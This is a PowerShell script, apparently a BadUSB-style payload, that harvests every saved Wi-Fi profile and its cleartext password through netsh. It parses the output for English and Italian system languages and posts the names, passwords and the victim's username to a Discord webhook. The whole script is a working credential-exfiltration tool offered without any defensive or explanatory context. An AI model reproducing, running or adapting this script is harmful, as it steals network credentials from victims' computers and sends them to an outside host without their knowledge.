############################################################################################################################################################
[cultureinfo]::CurrentUICulture = 'en-US'
[System.Threading.Thread]::CurrentThread.CurrentUICulture = 'en-US'
$wifiProfiles_EN = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
$wifiProfiles_IT = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Contenuto Chiave\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
############################################################################################################################################################



function Upload-Discord {
[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)
$hookurl = "$dc"
$Body = @{
  'username' = $env:username
  'content' = $text
}
if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}
if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text "IT> $wifiProfiles_IT"}
if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text "EN> $wifiProfiles_EN"}
